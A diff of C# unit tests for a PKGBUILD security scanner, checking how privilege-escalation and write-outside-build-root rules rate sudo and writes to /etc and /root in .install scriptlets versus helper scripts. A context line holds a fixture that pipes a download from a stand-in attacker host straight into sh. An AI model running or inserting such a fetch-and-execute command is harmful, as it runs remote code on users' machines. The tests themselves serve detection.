@@ -206,6 +206,71 @@ public class PkgBuildSecurityScannerTests
     }
 
     [Test]
+    public void Privilege_escalation_in_install_scriptlet_is_medium_and_does_not_block()
+    {
+        // Scriptlets already run as root under alpm's control: sudo inside one is
+        // redundant, not an escalation.
+        var result = Scan(("foo.install", "post_install() {\n  sudo systemctl enable foo.service\n}\n"));
+
+        var finding = result.Findings.First(f => f.RuleId == "privilege-escalation");
+        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.Medium));
+        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Verified));
+    }
+
+    [Test]
+    public void Write_outside_build_root_in_install_scriptlet_is_medium_and_does_not_block()
+    {
+        var result = Scan(("foo.install", "post_install() {\n  echo /bin/zsh >> /etc/shells\n}\n"));
+
+        var finding = result.Findings.First(f => f.RuleId == "write-outside-build-root");
+        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.Medium));
+        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Verified));
+    }
+
+    [Test]
+    public void Obfuscated_write_in_install_scriptlet_is_medium_and_does_not_block()
+    {
+        // upak regression: the \/root artifact escalated to Critical before the scriptlet
+        // context was taken into account.
+        var result = Scan(("upak.install", "echo \"/opt/x/upak/doc\" > \\/root/upak_help_path\n"));
+
+        var finding = result.Findings.First(f => f.RuleId == "write-outside-build-root");
+        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.Medium));
+        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Verified));
+    }
+
+    [Test]
+    public void Privilege_escalation_in_helper_script_still_flags()
+    {
+        // Helper scripts run outside alpm's control - only .install scriptlets are the
+        // already-root context.
+        var result = Scan(("setup.sh", "sudo systemctl enable foo.service\n"));
+
+        var finding = result.Findings.First(f => f.RuleId == "privilege-escalation");
+        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.High));
+        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Flagged));
+    }
+
+    [Test]
+    public void Write_outside_build_root_in_helper_script_still_flags()
+    {
+        var result = Scan(("setup.sh", "echo x > /etc/foo.conf\n"));
+
+        var finding = result.Findings.First(f => f.RuleId == "write-outside-build-root");
+        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.High));
+        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Flagged));
+    }
+
+    [Test]
+    public void Heredoc_help_text_mentioning_sudo_does_not_block()
+    {
+        var result = Scan(("PKGBUILD", "cat <<'EOF'\n## After editing run: sudo systemctl restart foo\nEOF\n"));
+
+        Assert.That(result.Findings.Any(f => f.RuleId == "privilege-escalation"), Is.False);
+        Assert.That(result.Status, Is.EqualTo(SecurityStatus.Verified));
+    }
+
+    [Test]
     public void Non_script_binary_file_is_not_scanned()
     {
         var result = Scan(("data.bin", "curl https://evil.example/x | sh\n"));
